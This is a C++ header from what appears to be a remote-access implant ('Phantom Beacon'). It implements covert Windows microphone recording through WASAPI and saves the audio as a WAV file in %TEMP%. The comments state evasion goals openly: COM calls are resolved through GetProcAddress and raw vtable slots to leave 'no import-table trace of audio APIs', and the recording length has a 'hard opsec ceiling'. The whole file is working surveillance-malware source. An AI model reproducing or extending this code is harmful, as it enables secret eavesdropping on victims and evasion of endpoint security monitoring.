#pragma once
// ============================================================================
//  wasapi_capture.h — Phantom Beacon Native Audio Capture (Windows)
//  ────────────────────────────────────────────────────────────────────────────
//  Header-only WASAPI microphone capture with NO external tools and NO
//  powershell: the old path used System.Media.SoundRecorder, a .NET type
//  that does not exist on modern Windows, so `audio` always failed silently.
//
//  Design:
//   - COM via GetProcAddress + raw vtable slots (no <audioclient.h>, no
//     import-table trace of audio APIs)
//   - Default CAPTURE device (microphone), shared mode, native mix format
//   - PCM/float data wrapped in a minimal WAV container written to %TEMP%
//   - Bounded capture window (sleep-poll), safe fallback return codes
// ============================================================================

#ifdef _WIN32

#include <windows.h>
#include <stdint.h>
#include <string>

namespace wasapi {

// ── Stable Vista+ GUIDs ─────────────────────────────────────────────────────
// MMDeviceEnumerator ships TWO coclass GUIDs: {BCDE0394...} is the one every
// SDK doc quotes, but trimmed/server images register only the sibling
// {BCDE0395...} ("MMDeviceEnumerator class"), found in the field. Both are
// tried in order — the first that CoCreates wins.
static const CLSID kCLSID_MMDeviceEnumerator_A =
    { 0xBCDE0394, 0xE52F, 0x467C, { 0x8E, 0x3D, 0xC4, 0x57, 0x92, 0x91, 0x69, 0x2E } };
static const CLSID kCLSID_MMDeviceEnumerator_B =
    { 0xBCDE0395, 0xE52F, 0x467C, { 0x8E, 0x3D, 0xC4, 0x57, 0x92, 0x91, 0x69, 0x2E } };
static const IID kIID_IMMDeviceEnumerator =
    { 0xA95664D2, 0x9614, 0x4F35, { 0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6 } };
static const IID kIID_IAudioClient =
    { 0x1CB9AD4C, 0xDBFA, 0x4C32, { 0xB1, 0x78, 0xC2, 0xF5, 0x68, 0xA7, 0x03, 0xB2 } };
static const IID kIID_IAudioCaptureClient =
    { 0xC8ADBD64, 0xE71E, 0x48A0, { 0xA4, 0xDE, 0x18, 0x5C, 0x39, 0x5C, 0xD3, 0x17 } };

// WAVEFORMATEX (needed explicitly — build may not pull mmreg.h)
struct Wfx {
    uint16_t wFormatTag; uint16_t nChannels; uint32_t nSamplesPerSec;
    uint32_t nAvgBytesPerSec; uint16_t nBlockAlign; uint16_t wBitsPerSample;
    uint16_t cbSize;
};

// Return codes
enum : int {
    OK = 0,
    E_COM       = -1,  // COM init failed
    E_ENUM      = -2,  // device enumeration failed
    E_ACTIVATE  = -3,  // IAudioClient activation failed
    E_INIT      = -4,  // Initialize failed (no mic / blocked)
    E_SERVICE   = -5,  // capture service unavailable
    E_NODATA    = -6,  // stream produced no data in the window
    E_WRITE     = -7,  // output file could not be written
};

// Minimal WAV writer (handles PCM + IEEE float mix formats)
static bool write_wav(const char* path, const Wfx& fmt,
                      const std::string& data) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;

    uint16_t tag = (fmt.wFormatTag == 3) ? 3 : 1;   // 3 = IEEE float
    uint32_t dataLen = (uint32_t)data.size();
    uint32_t riffLen = 36 + dataLen;

    char hdr[44];
    memcpy(hdr + 0,  "RIFF", 4); memcpy(hdr + 4,  &riffLen, 4);
    memcpy(hdr + 8,  "WAVE", 4); memcpy(hdr + 12, "fmt ", 4);
    uint32_t fmtSize = 16;           memcpy(hdr + 16, &fmtSize, 4);
    memcpy(hdr + 20, &tag, 2);       memcpy(hdr + 22, &fmt.nChannels, 2);
    memcpy(hdr + 24, &fmt.nSamplesPerSec, 4);
    memcpy(hdr + 28, &fmt.nAvgBytesPerSec, 4);
    memcpy(hdr + 32, &fmt.nBlockAlign, 2);
    memcpy(hdr + 34, &fmt.wBitsPerSample, 2);
    memcpy(hdr + 36, "data", 4);     memcpy(hdr + 40, &dataLen, 4);

    DWORD written = 0;
    bool ok = WriteFile(h, hdr, 44, &written, NULL) && written == 44;
    if (ok && dataLen) {
        ok = WriteFile(h, data.data(), dataLen, &written, NULL) && written == dataLen;
    }
    CloseHandle(h);
    return ok;
}

// Capture `seconds` of microphone audio into `outPath` (WAV).
inline int capture(int seconds, const char* outPath) {
    if (seconds <= 0)   seconds = 5;
    if (seconds > 120)  seconds = 120;   // hard opsec ceiling

    HMODULE hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) return E_COM;
    auto pCoInitializeEx = (HRESULT(WINAPI*)(LPVOID, DWORD))
        GetProcAddress(hOle32, "CoInitializeEx");
    auto pCoCreateInstance = (HRESULT(WINAPI*)(REFCLSID, LPVOID, DWORD, REFIID, LPVOID*))
        GetProcAddress(hOle32, "CoCreateInstance");
    auto pCoUninitialize = (void(WINAPI*)())
        GetProcAddress(hOle32, "CoUninitialize");
    if (!pCoInitializeEx || !pCoCreateInstance || !pCoUninitialize) {
        FreeLibrary(hOle32); return E_COM;
    }
    pCoInitializeEx(nullptr, 0x0);   // MTA

    int rc = E_NODATA;
    void* enumerator = nullptr;
    void* device = nullptr;
    void* client = nullptr;
    void* captureClient = nullptr;
    Wfx* fmt = nullptr;
    std::string pcm;

    do {
        // Try canonical CLSID, then the server-image sibling (BCDE0395).
        if (pCoCreateInstance(kCLSID_MMDeviceEnumerator_A, nullptr, CLSCTX_ALL,
                kIID_IMMDeviceEnumerator, &enumerator) != 0 || !enumerator) {
            if (pCoCreateInstance(kCLSID_MMDeviceEnumerator_B, nullptr, CLSCTX_ALL,
                    kIID_IMMDeviceEnumerator, &enumerator) != 0 || !enumerator) {
                rc = E_ENUM; break;
            }
        }
        // IMMDeviceEnumerator vtbl: [3] = EnumAudioEndpoints,
        // [4] = GetDefaultAudioEndpoint(This, dataFlow, role, &device)
        auto GetDefaultAudioEndpoint =
            (HRESULT(WINAPI*)(void*, int, int, void**))(*(void***)enumerator)[4];
        // dataFlow: eCapture = 1 (microphone); role: eConsole = 0
        if (GetDefaultAudioEndpoint(enumerator, 1, 0, &device) != 0 || !device) {
            rc = E_ENUM; break;
        }
        // IMMDevice vtbl: [3] = Activate(This, &IID, CLSCTX, params, &iface)
        auto Activate =
            (HRESULT(WINAPI*)(void*, const IID&, DWORD, void*, void**))(*(void***)device)[3];
        if (Activate(device, kIID_IAudioClient, CLSCTX_ALL, nullptr, &client) != 0 || !client) {
            rc = E_ACTIVATE; break;
        }
        // IAudioClient vtbl: [3] = Initialize(This, shareMode, flags, hnsBufDuration,
        //   hnsPeriodicity, pFormat, pGuid) — shared mode (0), 1 s buffer.
        auto Initialize =
            (HRESULT(WINAPI*)(void*, DWORD, DWORD, int64_t, int64_t, void*, void*))(*(void***)client)[3];
        // [8] = GetMixFormat(This, &fmt)
        auto GetMixFormat = (HRESULT(WINAPI*)(void*, void**))(*(void***)client)[8];
        if (GetMixFormat(client, (void**)&fmt) != 0 || !fmt) { rc = E_INIT; break; }
        if (Initialize(client, 0, 0, 10000000, 0, fmt, nullptr) != 0) {
            rc = E_INIT; break;
        }
        // [14] = GetService(This, &IID, &iface)
        auto GetService =
            (HRESULT(WINAPI*)(void*, const IID&, void**))(*(void***)client)[14];
        if (GetService(client, kIID_IAudioCaptureClient, &captureClient) != 0 || !captureClient) {
            rc = E_SERVICE; break;
        }
        // [10] = Start(This)
        auto Start = (HRESULT(WINAPI*)(void*))(*(void***)client)[10];
        if (Start(client) != 0) { rc = E_SERVICE; break; }

        // IAudioCaptureClient vtbl: [3] = GetBuffer(This, &data, &frames,
        //   &flags, &devPos, &qpcPos), [4] = ReleaseBuffer(This, frames),
        // [5] = GetNextPacketSize(This, &frames)
        auto GetBuffer = (HRESULT(WINAPI*)(void*, BYTE**, UINT32*, DWORD*, UINT64*, UINT64*))
            (*(void***)captureClient)[3];
        auto ReleaseBuffer = (HRESULT(WINAPI*)(void*, UINT32))(*(void***)captureClient)[4];
        auto GetNextPacketSize = (HRESULT(WINAPI*)(void*, UINT32*))(*(void***)captureClient)[5];

        // Collect loop: sleep-poll for the requested window.
        const DWORD window_ms = (DWORD)seconds * 1000;
        DWORD waited = 0;
        UINT32 silent_packets = 0;
        while (waited < window_ms) {
            UINT32 packet = 0;
            while (GetNextPacketSize(captureClient, &packet) == 0 && packet > 0) {
                BYTE* data = nullptr; UINT32 frames = 0;
                DWORD flags = 0; UINT64 devPos = 0, qpc = 0;
                if (GetBuffer(captureClient, &data, &frames, &flags, &devPos, &qpc) != 0) break;
                size_t bytes = (size_t)frames * fmt->nBlockAlign;
                if (data && bytes) pcm.append((const char*)data, bytes);
                ReleaseBuffer(captureClient, frames);
            }
            Sleep(100);
            waited += 100;
            if (++silent_packets > 600) break;   // ~60 s without polls → bail
        }
        // [11] = Stop(This)
        auto Stop = (HRESULT(WINAPI*)(void*))(*(void***)client)[11];
        Stop(client);

        if (pcm.empty()) { rc = E_NODATA; break; }
        if (!write_wav(outPath, *fmt, pcm)) { rc = E_WRITE; break; }
        rc = OK;
    } while (false);

    if (fmt) CoTaskMemFree(fmt);   // GetMixFormat allocates with CoTaskMemAlloc
    // Release COM refs (safe even if null — we skip via guards)
    if (captureClient) { auto unk = (IUnknown*)captureClient; unk->Release(); }
    if (client)        { auto unk = (IUnknown*)client;        unk->Release(); }
    if (device)        { auto unk = (IUnknown*)device;        unk->Release(); }
    if (enumerator)    { auto unk = (IUnknown*)enumerator;    unk->Release(); }
    pCoUninitialize();
    FreeLibrary(hOle32);
    return rc;
}

} // namespace wasapi

#endif // _WIN32
